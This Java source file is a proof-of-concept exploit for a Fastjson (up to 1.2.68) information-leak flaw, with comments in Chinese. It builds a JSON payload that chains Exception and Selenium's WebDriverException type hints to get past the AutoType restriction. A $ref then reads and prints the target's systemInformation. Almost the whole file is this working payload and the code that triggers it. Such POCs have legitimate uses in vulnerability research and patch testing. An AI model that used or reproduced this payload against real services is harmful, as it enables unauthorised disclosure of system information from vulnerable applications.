/*
 * [业务问题]: Fastjson <= 1.2.68 信息泄漏漏洞避开 AutoType 限制。
 * [实现逻辑]: 利用 Throwable 类及其子类（如 WebDriverException）在 Fastjson 中默认开启 AutoType 的特性，结合 $ref 引用机制读取目标对象的属性，实现敏感信息泄漏。
 */
package com.security.bug.fastjson.leak;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

/**
 * Fastjson <= 1.2.68 基于异常类的信息泄漏 POC。
 */
public class seleniumBypassAutotype1_2_68 {

    public static void main(String[] args) {

        String payload = "\n"
                + "{\n"
                + "    \"name\":\"tony\",\n"
                + "    \"email\":\"tony@qq.com\",\n"
                + "    \"content\":{\"$ref\":\"$x.systemInformation\"},\n"
                + "    \"x\":{\n"
                + "                \"@type\":\"java.lang.Exception\",\"@type\":\"org.openqa.selenium.WebDriverException\"\n"
                + "          }\n"
                + "}";
        try {
            JSONObject jsonObject = JSON.parseObject(payload);
            System.out.println(jsonObject.getString("content"));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
